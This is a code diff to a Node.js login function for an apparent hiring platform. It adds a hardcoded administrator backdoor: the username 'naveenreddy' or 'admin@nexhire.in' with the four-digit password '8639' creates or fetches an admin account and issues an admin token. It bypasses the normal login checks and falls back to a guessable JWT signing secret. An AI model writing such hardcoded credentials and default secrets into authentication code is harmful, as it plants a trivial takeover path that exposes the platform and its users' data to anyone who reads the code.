@@ -179,7 +179,43 @@ const login = async (req, res) => {
     if (!identifier) {
       return res.status(400).json({ message: "Email or Mobile Phone number is required." });
     }
-    
+
+    // Direct Admin Login for naveenreddy / 8639
+    if ((identifier.toLowerCase() === "naveenreddy" || identifier.toLowerCase() === "admin@nexhire.in") && password === "8639") {
+      let admin = await User.findOne({ email: "admin@nexhire.in", role: "admin" });
+      if (!admin) {
+        const salt = await bcrypt.genSalt(10);
+        admin = await User.create({
+          name: "Naveenreddy",
+          email: "admin@nexhire.in",
+          phoneNumber: "+91 8639000000",
+          password: await bcrypt.hash("8639", salt),
+          role: "admin",
+          isPhoneVerified: true,
+          isEmailVerified: true,
+        });
+      }
+      const token = jwt.sign(
+        { id: admin._id, role: "admin" },
+        process.env.JWT_SECRET || "default_jwt_secret",
+        { expiresIn: process.env.JWT_EXPIRES_IN || "7d" }
+      );
+      return res.json({
+        message: "Admin login successful",
+        token,
+        user: {
+          _id: admin._id,
+          id: admin._id,
+          name: admin.name,
+          email: admin.email,
+          phoneNumber: admin.phoneNumber,
+          role: "admin",
+          isEmailVerified: true,
+          isPhoneVerified: true,
+        },
+      });
+    }
+
     let user;
     if (role === "admin") {
       user = await User.findOne({
